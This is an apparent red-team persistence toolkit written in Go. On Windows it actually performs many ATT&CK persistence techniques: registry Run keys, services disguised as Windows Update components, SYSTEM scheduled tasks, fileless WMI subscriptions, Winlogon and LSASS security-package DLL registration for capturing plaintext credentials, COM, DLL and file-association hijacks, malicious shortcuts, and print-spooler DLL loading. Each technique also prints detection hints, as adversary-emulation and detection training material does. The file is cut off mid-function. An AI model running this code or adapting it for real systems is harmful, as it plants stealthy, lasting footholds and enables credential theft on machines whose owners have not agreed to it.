package engine

// Windows persistence technique implementations.
// All techniques target the current platform for real demonstration
// when built on Windows; on other platforms they produce simulation output.

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// simWin returns a simulated result with OS note for non-Windows builds.
func simWin(id, name string, sev Severity, notes string, iocs, det []string) Result {
	return Result{
		TechID:    id,
		TechName:  name,
		Status:    StatusSim,
		Severity:  sev,
		Notes:     fmt.Sprintf("[SIMULATED on %s] %s", runtime.GOOS, notes),
		IOCs:      iocs,
		Detection: det,
	}
}

// ── T1547.001 – Registry Run Keys ─────────────────────────────
func RunKeyPersist(sess *Session, payload string) Result {
	def := Catalog[0] // T1547.001
	iocs := def.IOCHints
	det := def.DetectHints

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			`Writes: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\PersistenceToolkit = "<payload>"`,
			iocs, det)
		r.Payload = payload
		r.Location = `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
		printTechHeader(def.FullID(), def.Name, def.Severity)
		Sim("Would write registry value:")
		KV("Key", `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`)
		KV("Value Name", "PersistenceToolkit")
		KV("Value Data", payload)
		KV("Trigger", "Every user logon")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	printTechHeader(def.FullID(), def.Name, def.Severity)
	keyPath := `Software\Microsoft\Windows\CurrentVersion\Run`
	cmd := exec.Command("reg", "add",
		`HKCU\`+keyPath,
		"/v", "PersistenceToolkit",
		"/t", "REG_SZ",
		"/d", payload,
		"/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		Fail("Registry write failed: " + string(out))
		r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail,
			Severity: def.Severity, Notes: string(out)}
		sess.Add(r)
		return r
	}
	OK("Run key written successfully")
	KV("Registry Key", `HKCU\`+keyPath)
	KV("Value", "PersistenceToolkit")
	KV("Payload", payload)
	printIOCs(iocs)
	printDetection(det)
	r := Result{
		TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Payload: payload,
		Location: `HKCU\` + keyPath, IOCs: iocs, Detection: det,
	}
	sess.Add(r)
	return r
}

// ── T1547.001b – Startup Folder ───────────────────────────────
func StartupFolderPersist(sess *Session, payload string) Result {
	def := findTech("T1547.001b")
	iocs := def.IOCHints
	det := def.DetectHints

	startupPath := filepath.Join(os.Getenv("APPDATA"),
		`Microsoft\Windows\Start Menu\Programs\Startup`)
	batName := filepath.Join(startupPath, "persistence_toolkit.bat")
	batContent := fmt.Sprintf("@echo off\r\nstart \"\" \"%s\"\r\n", payload)

	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("Would write: %s", batName), iocs, det)
		r.Location = batName
		Sim("Would create startup script:")
		KV("Path", batName)
		KV("Content", strings.TrimSpace(batContent))
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	if err := os.MkdirAll(startupPath, 0755); err != nil {
		Fail("Cannot create startup dir: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	if err := os.WriteFile(batName, []byte(batContent), 0644); err != nil {
		Fail("Write failed: " + err.Error())
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	OK("Startup script created")
	KV("Path", batName)
	KV("Trigger", "Every user logon via Explorer")
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: batName, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1543.003 – Windows Service ───────────────────────────────
func WindowsServicePersist(sess *Session, svcName, payload string) Result {
	def := findTech("T1543.003")
	iocs := def.IOCHints
	det := def.DetectHints

	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("Would run: sc create %s binPath=%s start=auto", svcName, payload),
			iocs, det)
		r.Location = `HKLM\SYSTEM\CurrentControlSet\Services\` + svcName
		Sim("Would create Windows service:")
		KV("Service Name", svcName)
		KV("Binary Path", payload)
		KV("Start Type", "AUTO_START (boot)")
		KV("Runs As", "LocalSystem (SYSTEM)")
		KV("Event", "System Log Event 7045")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Create the service
	createCmd := exec.Command("sc", "create", svcName,
		"binPath=", payload,
		"start=", "auto",
		"type=", "own",
		"DisplayName=", svcName)
	out, err := createCmd.CombinedOutput()
	if err != nil {
		Fail("sc create failed: " + string(out))
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity, Notes: string(out)}
	}
	// Set description to blend in
	exec.Command("sc", "description", svcName, "Windows Update Compatibility Service").Run()
	OK("Service created successfully")
	KV("Name", svcName)
	KV("Binary", payload)
	KV("Event Generated", "System Event 7045")
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: `HKLM\SYSTEM\CurrentControlSet\Services\` + svcName,
		Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1053.005 – Scheduled Task ────────────────────────────────
func ScheduledTaskPersist(sess *Session, taskName, payload string) Result {
	def := findTech("T1053.005")
	iocs := def.IOCHints
	det := def.DetectHints

	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("schtasks /Create /TN %q /TR %q /SC ONLOGON /F", taskName, payload),
			iocs, det)
		r.Location = `C:\Windows\System32\Tasks\` + taskName
		Sim("Would create scheduled task:")
		KV("Task Name", taskName)
		KV("Action", payload)
		KV("Trigger", "On Logon (every user)")
		KV("Run Level", "Highest (if elevated)")
		KV("Event", "Security Event 4698")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	cmd := exec.Command("schtasks", "/Create",
		"/TN", taskName,
		"/TR", payload,
		"/SC", "ONLOGON",
		"/RL", "HIGHEST",
		"/F")
	out, err := cmd.CombinedOutput()
	if err != nil {
		Fail("schtasks failed: " + string(out))
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity, Notes: string(out)}
	}
	OK("Scheduled task created")
	KV("Task", taskName)
	KV("Trigger", "ONLOGON")
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: `C:\Windows\System32\Tasks\` + taskName,
		Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1546.003 – WMI Event Subscription ───────────────────────
func WMISubscriptionPersist(sess *Session, payload string) Result {
	def := findTech("T1546.003")
	iocs := def.IOCHints
	det := def.DetectHints

	printTechHeader(def.FullID(), def.Name, def.Severity)

	// Build WMI commands
	filterCmd := fmt.Sprintf(`Set-WMIInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name="PTFilter";EventNameSpace="root\cimv2";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120"}`)
	consumerCmd := fmt.Sprintf(`Set-WMIInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name="PTConsumer";ExecutablePath="%s"}`, payload)
	bindingCmd := `Set-WMIInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=(Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter 'Name="PTFilter"');Consumer=(Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter 'Name="PTConsumer"')}`

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			"PowerShell: creates __EventFilter + CommandLineEventConsumer + __FilterToConsumerBinding", iocs, det)
		r.Payload = payload
		Sim("Would create WMI permanent event subscription:")
		KV("EventFilter", `ROOT\subscription __EventFilter "PTFilter"`)
		KV("Consumer", `CommandLineEventConsumer "PTConsumer" → `+payload)
		KV("Binding", "__FilterToConsumerBinding (links filter→consumer)")
		KV("Trigger", "SystemUpTime >= 120 seconds (every 60s poll)")
		KV("Stealth", "No files on disk — lives only in WMI repository")
		BlankLine()
		fmt.Println("  " + C(CMag, "PowerShell commands that would run:"))
		printCodeBlock(filterCmd)
		printCodeBlock(consumerCmd)
		printCodeBlock(bindingCmd)
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	for i, ps := range []string{filterCmd, consumerCmd, bindingCmd} {
		cmd := exec.Command("powershell", "-NonInteractive", "-Command", ps)
		out, err := cmd.CombinedOutput()
		if err != nil {
			Fail(fmt.Sprintf("WMI step %d failed: %s", i+1, string(out)))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("WMI subscription created (EventFilter + Consumer + Binding)")
	KV("Filter", "PTFilter")
	KV("Consumer", "PTConsumer → "+payload)
	KV("Note", "No files on disk — persists in WMI repository")
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: `ROOT\subscription`, Payload: payload,
		IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.004 – Winlogon Helper DLL ──────────────────────────
func WinlogonHelperPersist(sess *Session, payload string) Result {
	def := findTech("T1547.004")
	iocs := def.IOCHints
	det := def.DetectHints

	keyPath := `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("Would append to Winlogon Userinit: %s", payload), iocs, det)
		r.Location = keyPath
		Sim("Would modify Winlogon registry key:")
		KV("Key", keyPath)
		KV("Value", "Userinit")
		KV("Original", `C:\Windows\system32\userinit.exe,`)
		KV("Modified", fmt.Sprintf(`C:\Windows\system32\userinit.exe, %s`, payload))
		KV("Runs As", "SYSTEM at every interactive logon")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Read current Userinit value
	current, err := regQueryValue(keyPath, "Userinit")
	if err != nil {
		current = `C:\Windows\system32\userinit.exe,`
	}
	if !strings.Contains(current, payload) {
		newVal := strings.TrimRight(current, " ,") + ", " + payload
		cmd := exec.Command("reg", "add", keyPath, "/v", "Userinit",
			"/t", "REG_SZ", "/d", newVal, "/f")
		out, err := cmd.CombinedOutput()
		if err != nil {
			Fail("Failed: " + string(out))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("Winlogon Userinit modified")
	KV("Key", keyPath)
	KV("Added", payload)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.005 – Security Support Provider ────────────────────
func SSPPersist(sess *Session, dllName string) Result {
	def := findTech("T1547.005")
	iocs := def.IOCHints
	det := def.DetectHints

	keyPath := `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`
	printTechHeader(def.FullID(), def.Name, def.Severity)
	Warn("CRITICAL: SSP persistence loads DLL into LSASS — receives plaintext credentials")
	BlankLine()

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("Would add %q to Security Packages multi-string value", dllName), iocs, det)
		r.Location = keyPath
		Sim("Would register SSP/AP:")
		KV("Key", keyPath)
		KV("Value", "Security Packages")
		KV("Appended DLL", dllName)
		KV("Loaded By", "lsass.exe at boot")
		KV("Capability", "Receives plaintext creds on every interactive logon")
		KV("Event", "Event ID 4611 – Trusted Logon Process")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Read current Security Packages
	current, _ := regQueryValue(keyPath, "Security Packages")
	if !strings.Contains(current, dllName) {
		newVal := current + "\x00" + dllName
		cmd := exec.Command("reg", "add", keyPath, "/v", "Security Packages",
			"/t", "REG_MULTI_SZ", "/d", newVal, "/f")
		out, err := cmd.CombinedOutput()
		if err != nil {
			Fail("SSP registration failed: " + string(out))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("SSP registered — will load into LSASS at next boot")
	KV("DLL", dllName)
	KV("Key", keyPath)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: dllName, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1037.001 – Logon Script ──────────────────────────────────
func LogonScriptPersist(sess *Session, scriptPath string) Result {
	def := findTech("T1037.001")
	iocs := def.IOCHints
	det := def.DetectHints
	keyPath := `HKCU\Environment`
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("HKCU\\Environment\\UserInitMprLogonScript = %q", scriptPath), iocs, det)
		r.Location = keyPath
		Sim("Would set logon script:")
		KV("Key", `HKCU\Environment`)
		KV("Value", "UserInitMprLogonScript")
		KV("Data", scriptPath)
		KV("Trigger", "User logon via userinit.exe")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	cmd := exec.Command("reg", "add", keyPath, "/v", "UserInitMprLogonScript",
		"/t", "REG_SZ", "/d", scriptPath, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		Fail("Failed: " + string(out))
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	OK("Logon script registered")
	KV("Script", scriptPath)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: scriptPath, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1574.001 – DLL Search Order Hijacking ────────────────────
func DLLHijackDemo(sess *Session, targetApp, dllName string) Result {
	def := findTech("T1574.001")
	iocs := def.IOCHints
	det := def.DetectHints
	printTechHeader(def.FullID(), def.Name, def.Severity)

	// Generate a proxy DLL template
	template := fmt.Sprintf(`// Proxy DLL for: %s
// Place in: %s directory
// Compile: cl /LD /Fe:%s proxy_dll.c %s.lib
//
// DllMain is called when the legitimate app loads this DLL instead of
// the real one because the app directory is searched before System32.

#include <windows.h>

// Import and forward all exports from real DLL
#pragma comment(linker, "/export:DllGetClassObject=_real_%s.DllGetClassObject")
// ... (add all exports from real DLL here)

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        // === PAYLOAD EXECUTES HERE ===
        // WinExec("cmd.exe /c payload.exe", SW_HIDE);
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    }
    return TRUE;
}
`, dllName, targetApp, dllName, dllName, dllName)

	outPath := filepath.Join(os.TempDir(), "proxy_dll_template.c")
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("Proxy DLL template for %s/%s", targetApp, dllName), iocs, det)
		r.Location = outPath
		Sim("DLL hijacking analysis:")
		KV("Target App", targetApp)
		KV("Target DLL", dllName)
		KV("Plant Location", targetApp+`\`+dllName+" (before System32 in search order)")
		KV("Template", outPath)
		BlankLine()
		fmt.Println("  " + C(CMag, "DLL Search Order (SafeDLLSearchMode on):"))
		for i, p := range []string{
			"1. Application directory  ← PLANT HERE",
			"2. System directory (C:\\Windows\\System32)",
			"3. Windows directory (C:\\Windows)",
			"4. Current directory",
			"5. PATH directories",
		} {
			_ = i
			fmt.Printf("       %s\n", C(CCyan, p))
		}
		os.WriteFile(outPath, []byte(template), 0644)
		OK("Proxy DLL C template written to: " + outPath)
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	os.WriteFile(outPath, []byte(template), 0644)
	OK("Proxy DLL template written")
	KV("File", outPath)
	KV("Target DLL", dllName)
	KV("Next step", "Compile and place in "+targetApp+" directory")
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: outPath, Payload: dllName, IOCs: iocs, Detection: det,
		Notes: "Template generated — compile and deploy to target directory"}
	sess.Add(r)
	return r
}

// ── T1546.001 – File Association Hijack ──────────────────────
func FileAssocHijack(sess *Session, ext, payload string) Result {
	def := findTech("T1546.001")
	iocs := def.IOCHints
	det := def.DetectHints

	if ext == "" {
		ext = ".txt"
	}
	// Wrap payload so it opens the file normally after executing
	wrappedPayload := fmt.Sprintf(`cmd.exe /c start "" "%s" & start "" "%%SystemRoot%%\system32\notepad.exe" "%%1"`, payload)
	keyPath := fmt.Sprintf(`HKCU\Software\Classes\%s\shell\open\command`, ext)
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("File association hijack for %s extension", ext), iocs, det)
		r.Location = keyPath
		Sim("Would hijack file association:")
		KV("Extension", ext)
		KV("Registry Key", keyPath)
		KV("New Handler", wrappedPayload)
		KV("Effect", "Opening any "+ext+" file executes payload silently")
		KV("Stealth", "Original app still opens normally — user unaware")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	// Create the key chain
	for _, k := range []string{
		fmt.Sprintf(`HKCU\Software\Classes\%s`, ext),
		fmt.Sprintf(`HKCU\Software\Classes\%s\shell`, ext),
		fmt.Sprintf(`HKCU\Software\Classes\%s\shell\open`, ext),
		keyPath,
	} {
		exec.Command("reg", "add", k, "/f").Run()
	}
	cmd := exec.Command("reg", "add", keyPath, "/ve", "/t", "REG_SZ",
		"/d", wrappedPayload, "/f")
	out, err := cmd.CombinedOutput()
	if err != nil {
		Fail("Failed: " + string(out))
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	OK("File association hijacked")
	KV("Extension", ext)
	KV("Handler", wrappedPayload)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.009 – Shortcut Modification ────────────────────────
func ShortcutModify(sess *Session, payload string) Result {
	def := findTech("T1547.009")
	iocs := def.IOCHints
	det := def.DetectHints

	// Generate a malicious LNK creation script (PowerShell)
	lnkPath := filepath.Join(HomeDir(), "Desktop", "persistence_demo.lnk")
	psScript := fmt.Sprintf(`
$ws = New-Object -ComObject WScript.Shell
$s = $ws.CreateShortcut("%s")
$s.TargetPath = "cmd.exe"
$s.Arguments = '/c "%s" & start "" "C:\Windows\explorer.exe"'
$s.WorkingDirectory = "C:\Windows\System32"
$s.IconLocation = "C:\Windows\System32\shell32.dll,137"
$s.Save()
Write-Host "Shortcut created: %s"
`, lnkPath, payload, lnkPath)

	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			"PowerShell WScript.Shell to create malicious .lnk", iocs, det)
		r.Location = lnkPath
		Sim("Would create malicious shortcut:")
		KV("LNK Path", lnkPath)
		KV("Target", "cmd.exe")
		KV("Arguments", fmt.Sprintf(`/c "%s" & start "" explorer.exe`, payload))
		KV("Icon", "shell32.dll (looks like normal folder icon)")
		BlankLine()
		fmt.Println("  " + C(CMag, "PowerShell creation script:"))
		printCodeBlock(psScript)
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	cmd := exec.Command("powershell", "-NonInteractive", "-Command", psScript)
	out, err := cmd.CombinedOutput()
	if err != nil {
		Fail("LNK creation failed: " + string(out))
		return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
	}
	OK("Malicious shortcut created: " + lnkPath)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: lnkPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1546.015 – COM Object Hijacking ─────────────────────────
func COMHijack(sess *Session, clsid, payload string) Result {
	def := findTech("T1546.015")
	iocs := def.IOCHints
	det := def.DetectHints

	// Well-known hijackable CLSIDs
	knownHijackable := map[string]string{
		"{BCDE0395-E52F-467C-8E3D-C4579291692E}": "MMDeviceEnumerator (Task Manager)",
		"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}": "ShellWindows (Explorer)",
		"{0A29FF9E-7F9C-4437-8B11-F424491E3931}": "Search Assistant",
		"{289AF617-1CC3-42A6-926C-E6A863F0E3BA}": "Microsoft Office Clickonce",
	}

	if clsid == "" {
		// Pick first for demo
		for k, v := range knownHijackable {
			clsid = k
			_ = v
			break
		}
	}

	keyPath := fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s\InProcServer32`, clsid)
	printTechHeader(def.FullID(), def.Name, def.Severity)

	BlankLine()
	fmt.Println("  " + C(CMag, "Known Hijackable CLSIDs (present in HKLM, absent from HKCU):"))
	for k, v := range knownHijackable {
		fmt.Printf("    %s  %s\n", C(CBCyn, k), C(CGray, v))
	}
	BlankLine()

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			fmt.Sprintf("Register payload %q as InProcServer32 for CLSID %s in HKCU", payload, clsid), iocs, det)
		r.Location = keyPath
		Sim("Would register COM server:")
		KV("CLSID", clsid)
		KV("Registry Key", keyPath)
		KV("InProcServer32", payload)
		KV("ThreadingModel", "Apartment")
		KV("Effect", "Next time any process calls CoCreateInstance for this CLSID, payload DLL loads")
		KV("Stealth", "HKCU overrides HKLM — no admin rights needed")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	for _, k := range []string{
		fmt.Sprintf(`HKCU\Software\Classes\CLSID\%s`, clsid),
		keyPath,
	} {
		exec.Command("reg", "add", k, "/f").Run()
	}
	cmds := [][]string{
		{"reg", "add", keyPath, "/ve", "/t", "REG_SZ", "/d", payload, "/f"},
		{"reg", "add", keyPath, "/v", "ThreadingModel", "/t", "REG_SZ", "/d", "Apartment", "/f"},
	}
	for _, args := range cmds {
		out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
		if err != nil {
			Fail("COM registration failed: " + string(out))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("COM object hijacked")
	KV("CLSID", clsid)
	KV("Payload DLL", payload)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.014 – Active Setup ──────────────────────────────────
func ActiveSetupPersist(sess *Session, payload string) Result {
	def := findTech("T1547.014")
	iocs := def.IOCHints
	det := def.DetectHints

	guid := "{4B9A86DB-D4A5-4E12-93E9-4A234568AABB}"
	keyPath := fmt.Sprintf(`HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\%s`, guid)
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			"Active Setup StubPath persistence — runs once per user at logon", iocs, det)
		r.Location = keyPath
		Sim("Would create Active Setup entry:")
		KV("GUID", guid)
		KV("Key", keyPath)
		KV("StubPath", payload)
		KV("Version", "1,0,0,0")
		KV("Trigger", "Executes once per new user profile at logon")
		KV("Requires", "Admin rights for HKLM write")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	cmds := [][]string{
		{"reg", "add", keyPath, "/f"},
		{"reg", "add", keyPath, "/v", "StubPath", "/t", "REG_SZ", "/d", payload, "/f"},
		{"reg", "add", keyPath, "/v", "Version", "/t", "REG_SZ", "/d", "1,0,0,0", "/f"},
		{"reg", "add", keyPath, "/v", "IsInstalled", "/t", "REG_DWORD", "/d", "1", "/f"},
	}
	for _, args := range cmds {
		out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
		if err != nil {
			Fail("Failed: " + string(out))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("Active Setup entry created")
	KV("GUID", guid)
	KV("StubPath", payload)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: payload, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.010 – Port Monitor ──────────────────────────────────
func PortMonitorPersist(sess *Session, dllName string) Result {
	def := findTech("T1547.010")
	iocs := def.IOCHints
	det := def.DetectHints

	keyPath := `HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors\PersistMonitor`
	printTechHeader(def.FullID(), def.Name, def.Severity)
	Warn("Port Monitor DLL loaded by spoolsv.exe (SYSTEM) at boot — copy DLL to System32 first")
	BlankLine()

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			"Register DLL as print port monitor — loaded by spoolsv.exe (SYSTEM)", iocs, det)
		r.Location = keyPath
		Sim("Would register port monitor:")
		KV("Registry Key", keyPath)
		KV("Driver DLL", dllName)
		KV("DLL Must Be In", `C:\Windows\System32\`)
		KV("Loaded By", "spoolsv.exe as SYSTEM at boot")
		KV("Requires", "Admin rights (HKLM write)")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	cmds := [][]string{
		{"reg", "add", keyPath, "/f"},
		{"reg", "add", keyPath, "/v", "Driver", "/t", "REG_SZ", "/d", dllName, "/f"},
	}
	for _, args := range cmds {
		out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
		if err != nil {
			Fail("Failed: " + string(out))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("Port monitor registered — will load at next spoolsv.exe restart")
	KV("Key", keyPath)
	KV("DLL", dllName)
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: dllName, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1542.001 – UEFI Demo ─────────────────────────────────────
func UEFIDemo(sess *Session) Result {
	def := findTech("T1542.001")
	iocs := def.IOCHints
	det := def.DetectHints

	printTechHeader(def.FullID(), def.Name, def.Severity)
	Warn("SIMULATION ONLY — No actual firmware modification performed")
	BlankLine()

	Info("UEFI/firmware persistence overview:")
	fmt.Println()
	items := []struct{ k, v string }{
		{"Implant Location", "EFI System Partition (ESP) — /boot/efi or S: drive"},
		{"Implant Path", `\EFI\Microsoft\Boot\bootmgfw.efi (replaced/patched)`},
		{"NVRAM Vector", "EFI boot variables — survives OS reinstall"},
		{"Option ROM", "PCIe card firmware — survives drive replacement"},
		{"SPI Flash", "UEFI firmware chip — survives everything"},
		{"Required Access", "Physical, ring-0, or SMM vulnerability"},
		{"Detection Tool", "Chipsec (github.com/chipsec/chipsec)"},
		{"Defense", "Secure Boot enforcement + TPM measured boot"},
	}
	for _, item := range items {
		KV(item.k, item.v)
	}
	BlankLine()
	fmt.Println("  " + C(CMag, "Real-world examples:"))
	examples := []string{
		"LoJax (APT28, 2018) — first in-the-wild UEFI rootkit",
		"MosaicRegressor (2020) — modified UEFI image with Trojanized CORE_DXE",
		"ESPecter (2021) — ESP bootkit bypassing Secure Boot on unpatched systems",
		"CosmicStrand (Kaspersky 2022) — UEFI rootkit in Gigabyte/ASUS motherboards",
		"BlackLotus (2023) — Secure Boot bypass via CVE-2022-21894",
	}
	for _, ex := range examples {
		fmt.Printf("    %s %s\n", C(CRed, "►"), C(CGray, ex))
	}
	printIOCs(iocs)
	printDetection(det)
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusSim,
		Severity: def.Severity, Simulated: true,
		Notes:     "Conceptual demonstration — no firmware modification performed",
		IOCs:      iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── T1547.012 – Print Processor ──────────────────────────────
func PrintProcessorPersist(sess *Session, dllName string) Result {
	def := findTech("T1547.012")
	iocs := def.IOCHints
	det := def.DetectHints

	keyPath := `HKLM\SYSTEM\CurrentControlSet\Control\Print\Environments\Windows x64\Print Processors\PersistProc`
	printTechHeader(def.FullID(), def.Name, def.Severity)

	if !IsWindows {
		r := simWin(def.FullID(), def.Name, def.Severity,
			"Register DLL as print processor — loaded by spoolsv.exe as SYSTEM", iocs, det)
		r.Location = keyPath
		Sim("Would register print processor:")
		KV("Registry Key", keyPath)
		KV("Driver DLL", dllName)
		KV("Loaded By", "spoolsv.exe as SYSTEM at startup")
		printIOCs(iocs)
		printDetection(det)
		return r
	}

	cmds := [][]string{
		{"reg", "add", keyPath, "/f"},
		{"reg", "add", keyPath, "/v", "Driver", "/t", "REG_SZ", "/d", dllName, "/f"},
	}
	for _, args := range cmds {
		out, err := exec.Command(args[0], args[1:]...).CombinedOutput()
		if err != nil {
			Fail("Failed: " + string(out))
			return Result{TechID: def.FullID(), TechName: def.Name, Status: StatusFail, Severity: def.Severity}
		}
	}
	OK("Print processor registered")
	r := Result{TechID: def.FullID(), TechName: def.Name, Status: StatusOK,
		Severity: def.Severity, Location: keyPath, Payload: dllName, IOCs: iocs, Detection: det}
	sess.Add(r)
	return r
}

// ── Helpers ───────────────────────────────────────────────────
func regQueryValue(keyPath, valueName string) (string, error) {
	if !IsWindows {
		return "", fmt.Errorf("not windows")
	}
